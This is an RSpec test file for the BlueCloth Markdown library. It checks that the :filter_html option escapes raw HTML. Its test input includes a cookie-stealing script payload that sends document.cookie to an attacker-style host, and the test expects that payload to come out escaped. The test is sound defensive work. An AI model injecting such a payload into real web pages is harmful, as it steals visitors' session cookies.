#!/usr/bin/env ruby

BEGIN {
	require 'pathname'
	basedir = Pathname.new( __FILE__ ).dirname.parent

	libdir = basedir + 'lib'

	$LOAD_PATH.unshift( basedir ) unless $LOAD_PATH.include?( basedir )
	$LOAD_PATH.unshift( libdir ) unless $LOAD_PATH.include?( libdir )
}

require 'rspec'
require 'bluecloth'

require 'spec/lib/helpers'


#####################################################################
###	C O N T E X T S
#####################################################################

describe BlueCloth, "contributed features: " do
	include BlueCloth::TestConstants,
		BlueCloth::Matchers

	### HTML filter options contributed by Florian Gross.
	describe "Florian Gross's HTML filtering (backward-compatibility)" do

		DANGEROUS_HTML =
			"<script>document.location='http://www.hacktehplanet.com" +
			"/cgi-bin/cookie.cgi?' + document.cookie</script>"
		DANGEROUS_HTML_OUTPUT =
			"<p>&lt;script>document.location='http://www.hacktehplanet.com" +
			"/cgi-bin/cookie.cgi?' + document.cookie&lt;/script></p>"

		NO_LESS_THAN_TEXT = "Foo is definitely > than bar"
		NO_LESS_THAN_OUTPUT = "<p>Foo is definitely > than bar</p>"


		### Test the :filter_html restriction
		it "can be configured with html filtering when created" do
			bc = BlueCloth.new( 'foo', :filter_html )
			bc.options.should include( :escape_html )
		end


		it "can be configured with html filtering (via an Array of options) when created" do
			bc = BlueCloth.new( 'foo', [:filter_html] )
			bc.options.should include( :escape_html )
		end


		it "can escape any existing HTML in the input if configured to do so" do
			the_markdown( DANGEROUS_HTML, :filter_html ).
				should be_transformed_into( DANGEROUS_HTML_OUTPUT )
		end


		it "doesn't raise an exception when filtering source with a lone closing angle bracket" do
			the_markdown( NO_LESS_THAN_TEXT, :filter_html ).
				should be_transformed_into( NO_LESS_THAN_OUTPUT )
		end


		it "ignores a :filter_styles argument for RedCloth compatibility" do
			lambda {
				BlueCloth.new( '', :filter_styles )
			}.should_not raise_error()
		end
	end

end

